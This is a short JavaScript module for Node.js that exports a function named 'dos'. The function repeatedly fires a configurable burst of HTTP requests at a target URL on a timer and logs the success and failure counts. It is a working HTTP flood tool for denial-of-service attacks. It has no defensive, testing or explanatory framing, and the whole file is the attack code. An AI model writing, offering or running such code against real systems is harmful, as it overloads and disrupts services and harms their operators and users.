const req = require('request')

const dos = (url, qty, ms) => {
    let err = ok = 0

    setInterval(_ => {

        for (let i = qty; i--;)
            req(url, error => !error ? ok++ : err++)

        console.log(`result:' ${ ok } ${ err }`)

        err = ok = 0

    }, ms)
}

module.exports = dos